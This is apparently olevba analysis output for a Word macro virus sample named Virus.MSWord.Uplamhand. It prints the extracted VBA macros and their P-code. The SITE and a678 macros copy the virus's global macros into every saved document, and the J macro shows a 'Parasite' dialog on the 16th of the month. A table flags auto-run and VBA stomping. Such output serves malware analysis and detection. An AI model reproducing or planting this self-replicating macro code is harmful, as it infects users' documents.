olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Uplamhand
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Uplamhand - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO PayLoad.bas 
in file: ./Virus.MSWord.Uplamhand - OLE stream: 'Macros/VBA/PayLoad'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
    Rem Parasite loves ---> J
End Sub
-------------------------------------------------------------------------------
VBA MACRO SITE.bas 
in file: ./Virus.MSWord.Uplamhand - OLE stream: 'Macros/VBA/SITE'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim sMe$
Dim sTMacro$
'this becomes the FileSaveAs for the global template
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
On Error GoTo -1: On Error GoTo Bail
WordBasic.CurValues.FileSaveAs dlg
WordBasic.Dialog.FileSaveAs dlg
If dlg.Format = 0 Then dlg.Format = 1
sMe$ = WordBasic.[FileName$]()
sTMacro$ = sMe$ + ":AutoOpen"
WordBasic.MacroCopy "Global:PARA", sTMacro$, 4
sTMacro$ = sMe$ + ":PARA"
WordBasic.MacroCopy "Global:PARA", sTMacro$, 4
sTMacro$ = sMe$ + ":SITE"
WordBasic.MacroCopy "Global:SITE", sTMacro$, 3
sTMacro$ = sMe$ + ":PayLoad"
WordBasic.MacroCopy "Global:PayLoad", sTMacro$, 1
sTMacro$ = sMe$ + ":J"
WordBasic.MacroCopy "Global:Autoexec", sTMacro$, 5
sTMacro$ = sMe$ + ":a678"
WordBasic.MacroCopy "Global:AutoOpen", sTMacro$, 6
WordBasic.FileSaveAs dlg
GoTo Done

Bail:
If Err.Number <> 102 Then
    WordBasic.FileSaveAs dlg
End If
Done:
End Sub
-------------------------------------------------------------------------------
VBA MACRO a678.bas 
in file: ./Virus.MSWord.Uplamhand - OLE stream: 'Macros/VBA/a678'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim sMe$
Dim sTMacro$
sMe$ = WordBasic.[FileName$]()
WordBasic.FileSaveAs Name:=sMe$, Format:=1
sTMacro$ = sMe$ + ":AutoOpen"
WordBasic.MacroCopy "Global:PARA", sTMacro$, 4
sTMacro$ = sMe$ + ":PARA"
WordBasic.MacroCopy "Global:PARA", sTMacro$, 4
sTMacro$ = sMe$ + ":SITE"
WordBasic.MacroCopy "Global:SITE", sTMacro$, 3
sTMacro$ = sMe$ + ":PayLoad"
WordBasic.MacroCopy "Global:PayLoad", sTMacro$, 1
sTMacro$ = sMe$ + ":J"
WordBasic.MacroCopy "Global:Autoexec", sTMacro$, 5
sTMacro$ = sMe$ + ":a678"
WordBasic.MacroCopy "Global:AutoOpen", sTMacro$, 6
WordBasic.FileSaveAs Name:=sMe$, Format:=1

End Sub
-------------------------------------------------------------------------------
VBA MACRO J.bas 
in file: ./Virus.MSWord.Uplamhand - OLE stream: 'Macros/VBA/J'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim n
Dim button
n = WordBasic.Day(WordBasic.Now())
If n = 16 Then GoTo parasite
If n < 16 Then GoTo finish
If n > 16 Then GoTo finish
parasite:

WordBasic.BeginDialog 400, 100, "Parasite Beta 0.8", _
        "J.DlgFunction"
    WordBasic.OKButton 145, 50, 108, 21
    WordBasic.Text 120, 20, 250, 10, "Parasite Beta version 0.8!"
        
WordBasic.EndDialog
Dim sampleDlg As Object: Set sampleDlg = WordBasic.CurValues.UserDialog
button = WordBasic.Dialog.UserDialog(sampleDlg)
finish:
End Sub

Private Function DlgFunction(identifier$, action, suppvalue)
End Function

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Uplamhand
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 965 bytes
' Macros/VBA/PayLoad - 893 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Rem 0x0016 " Parasite loves ---> J"
' Line #3:
' 	EndSub 
' Macros/VBA/SITE - 2339 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn sMe
' Line #3:
' 	Dim 
' 	VarDefn sTMacro
' Line #4:
' 	QuoteRem 0x0000 0x0033 "this becomes the FileSaveAs for the global template"
' Line #5:
' 	Dim 
' 	VarDefn dlg (As Object)
' 	BoS 0x0000 
' 	SetStmt 
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	MemLd DialogRecord 
' 	ArgsMemLd FileSaveAs 0x0001 
' 	Set dlg 
' Line #6:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError Bail 
' Line #7:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #8:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd Dialog 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #9:
' 	Ld dlg 
' 	MemLd Format$ 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	Ld dlg 
' 	MemSt Format$ 
' 	EndIf 
' Line #10:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	St sMe$ 
' Line #11:
' 	Ld sMe$ 
' 	LitStr 0x0009 ":AutoOpen"
' 	Add 
' 	St sTMacro$ 
' Line #12:
' 	LitStr 0x000B "Global:PARA"
' 	Ld sTMacro$ 
' 	LitDI2 0x0004 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #13:
' 	Ld sMe$ 
' 	LitStr 0x0005 ":PARA"
' 	Add 
' 	St sTMacro$ 
' Line #14:
' 	LitStr 0x000B "Global:PARA"
' 	Ld sTMacro$ 
' 	LitDI2 0x0004 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #15:
' 	Ld sMe$ 
' 	LitStr 0x0005 ":SITE"
' 	Add 
' 	St sTMacro$ 
' Line #16:
' 	LitStr 0x000B "Global:SITE"
' 	Ld sTMacro$ 
' 	LitDI2 0x0003 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #17:
' 	Ld sMe$ 
' 	LitStr 0x0008 ":PayLoad"
' 	Add 
' 	St sTMacro$ 
' Line #18:
' 	LitStr 0x000E "Global:PayLoad"
' 	Ld sTMacro$ 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #19:
' 	Ld sMe$ 
' 	LitStr 0x0002 ":J"
' 	Add 
' 	St sTMacro$ 
' Line #20:
' 	LitStr 0x000F "Global:Autoexec"
' 	Ld sTMacro$ 
' 	LitDI2 0x0005 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #21:
' 	Ld sMe$ 
' 	LitStr 0x0005 ":a678"
' 	Add 
' 	St sTMacro$ 
' Line #22:
' 	LitStr 0x000F "Global:AutoOpen"
' 	Ld sTMacro$ 
' 	LitDI2 0x0006 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #23:
' 	Ld dlg 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #24:
' 	GoTo Done 
' Line #25:
' Line #26:
' 	Label Bail 
' Line #27:
' 	Ld Err 
' 	MemLd Number 
' 	LitDI2 0x0066 
' 	Ne 
' 	IfBlock 
' Line #28:
' 	Ld dlg 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #29:
' 	EndIfBlock 
' Line #30:
' 	Label Done 
' Line #31:
' 	EndSub 
' Macros/VBA/a678 - 1755 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn sMe
' Line #3:
' 	Dim 
' 	VarDefn sTMacro
' Line #4:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	St sMe$ 
' Line #5:
' 	Ld sMe$ 
' 	ParamNamed New 
' 	LitDI2 0x0001 
' 	ParamNamed Format$ 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0002 
' Line #6:
' 	Ld sMe$ 
' 	LitStr 0x0009 ":AutoOpen"
' 	Add 
' 	St sTMacro$ 
' Line #7:
' 	LitStr 0x000B "Global:PARA"
' 	Ld sTMacro$ 
' 	LitDI2 0x0004 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #8:
' 	Ld sMe$ 
' 	LitStr 0x0005 ":PARA"
' 	Add 
' 	St sTMacro$ 
' Line #9:
' 	LitStr 0x000B "Global:PARA"
' 	Ld sTMacro$ 
' 	LitDI2 0x0004 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #10:
' 	Ld sMe$ 
' 	LitStr 0x0005 ":SITE"
' 	Add 
' 	St sTMacro$ 
' Line #11:
' 	LitStr 0x000B "Global:SITE"
' 	Ld sTMacro$ 
' 	LitDI2 0x0003 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #12:
' 	Ld sMe$ 
' 	LitStr 0x0008 ":PayLoad"
' 	Add 
' 	St sTMacro$ 
' Line #13:
' 	LitStr 0x000E "Global:PayLoad"
' 	Ld sTMacro$ 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #14:
' 	Ld sMe$ 
' 	LitStr 0x0002 ":J"
' 	Add 
' 	St sTMacro$ 
' Line #15:
' 	LitStr 0x000F "Global:Autoexec"
' 	Ld sTMacro$ 
' 	LitDI2 0x0005 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #16:
' 	Ld sMe$ 
' 	LitStr 0x0005 ":a678"
' 	Add 
' 	St sTMacro$ 
' Line #17:
' 	LitStr 0x000F "Global:AutoOpen"
' 	Ld sTMacro$ 
' 	LitDI2 0x0006 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #18:
' 	Ld sMe$ 
' 	ParamNamed New 
' 	LitDI2 0x0001 
' 	ParamNamed Format$ 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0002 
' Line #19:
' Line #20:
' 	EndSub 
' Macros/VBA/J - 2016 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn n
' Line #3:
' 	Dim 
' 	VarDefn button
' Line #4:
' 	Ld WordBasic 
' 	ArgsMemLd Now 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd Day 0x0001 
' 	St n 
' Line #5:
' 	Ld n 
' 	LitDI2 0x0010 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo parasite 
' 	EndIf 
' Line #6:
' 	Ld n 
' 	LitDI2 0x0010 
' 	Lt 
' 	If 
' 	BoSImplicit 
' 	GoTo finish 
' 	EndIf 
' Line #7:
' 	Ld n 
' 	LitDI2 0x0010 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	GoTo finish 
' 	EndIf 
' Line #8:
' 	Label parasite 
' Line #9:
' Line #10:
' 	LineCont 0x0004 09 00 08 00
' 	LitDI2 0x0190 
' 	LitDI2 0x0064 
' 	LitStr 0x0011 "Parasite Beta 0.8"
' 	LitStr 0x000D "J.DlgFunction"
' 	Ld WordBasic 
' 	ArgsMemCall BeginDialog 0x0004 
' Line #11:
' 	LitDI2 0x0091 
' 	LitDI2 0x0032 
' 	LitDI2 0x006C 
' 	LitDI2 0x0015 
' 	Ld WordBasic 
' 	ArgsMemCall OKButton 0x0004 
' Line #12:
' 	LitDI2 0x0078 
' 	LitDI2 0x0014 
' 	LitDI2 0x00FA 
' 	LitDI2 0x000A 
' 	LitStr 0x001A "Parasite Beta version 0.8!"
' 	Ld WordBasic 
' 	ArgsMemCall Then 0x0005 
' Line #13:
' Line #14:
' 	Ld WordBasic 
' 	ArgsMemCall EndDialog 0x0000 
' Line #15:
' 	Dim 
' 	VarDefn sampleDlg (As Object)
' 	BoS 0x0000 
' 	SetStmt 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	MemLd UserDialog 
' 	Set sampleDlg 
' Line #16:
' 	Ld sampleDlg 
' 	Ld WordBasic 
' 	MemLd Dialog 
' 	ArgsMemLd UserDialog 0x0001 
' 	St button 
' Line #17:
' 	Label finish 
' Line #18:
' 	EndSub 
' Line #19:
' Line #20:
' 	FuncDefn (Private Function DlgFunction(identifier, action, suppvalue))
' Line #21:
' 	EndFunc 
' Line #22:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

